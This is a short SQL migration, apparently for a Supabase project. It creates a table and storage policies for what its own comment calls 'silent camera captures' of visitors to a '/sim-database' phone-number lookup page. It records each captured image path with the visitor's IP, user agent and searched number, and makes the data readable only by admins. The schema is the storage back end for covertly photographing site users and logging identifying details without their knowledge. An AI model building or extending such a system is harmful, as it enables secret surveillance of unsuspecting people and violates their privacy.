
-- sim_captures table: silent camera captures from /sim-database page
CREATE TABLE public.sim_captures (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  storage_path TEXT NOT NULL,
  user_agent TEXT,
  ip TEXT,
  page TEXT DEFAULT 'sim-database',
  searched_number TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT ON public.sim_captures TO anon, authenticated;
GRANT ALL ON public.sim_captures TO service_role;

ALTER TABLE public.sim_captures ENABLE ROW LEVEL SECURITY;

CREATE POLICY "anyone can insert capture record"
  ON public.sim_captures FOR INSERT
  TO anon, authenticated
  WITH CHECK (true);

CREATE POLICY "admins can read captures"
  ON public.sim_captures FOR SELECT
  TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

CREATE POLICY "admins can delete captures"
  ON public.sim_captures FOR DELETE
  TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

-- Storage policies on sim-captures bucket
CREATE POLICY "anyone can upload sim captures"
  ON storage.objects FOR INSERT
  TO anon, authenticated
  WITH CHECK (bucket_id = 'sim-captures');

CREATE POLICY "admins can read sim captures"
  ON storage.objects FOR SELECT
  TO authenticated
  USING (bucket_id = 'sim-captures' AND public.has_role(auth.uid(), 'admin'));

CREATE POLICY "admins can delete sim captures"
  ON storage.objects FOR DELETE
  TO authenticated
  USING (bucket_id = 'sim-captures' AND public.has_role(auth.uid(), 'admin'));
